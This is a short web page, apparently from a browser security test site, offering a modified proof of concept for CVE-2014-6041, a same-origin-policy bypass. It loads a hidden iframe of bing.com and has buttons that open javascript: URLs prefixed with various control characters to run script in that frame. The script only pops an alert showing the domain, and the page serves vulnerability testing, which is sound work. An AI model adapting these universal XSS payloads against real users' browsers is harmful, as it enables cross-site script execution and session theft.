---
layout: default
title: SOP Bypass - Testcase 8
permalink: /sop/new/8
---

# SOP Bypass - Testcase 8

Modified version of CVE-2014-6041 for testing other control characters

<iframe height="0" width="0" name="CVE-2014-6041" src="https://web.archive.org/web/20180831120258if_/https://www.bing.com/" style="display:none;" data-ruffle-polyfilled=""></iframe>

<input type="button" id="btn_test" class="test" value="Run Test Case 1" onclick="window.open('\u0000javascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 2" onclick="window.open('\u000ajavascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 3" onclick="window.open('\u000bjavascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 4" onclick="window.open('\u000cjavascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 5" onclick="window.open('\u000djavascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 6" onclick="window.open('\u0020javascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 6" onclick="window.open('\u002Cjavascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 7" onclick="window.open('\u003Bjavascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 8" onclick="window.open('\u0009javascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 9" onclick="window.open('\u002Bjavascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 10" onclick="window.open('\u0028javascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">

**Note:**
If page loads popup and displays an alert box "Accessed Property of bing.com, your browser is vulnerable to SOP bypass."
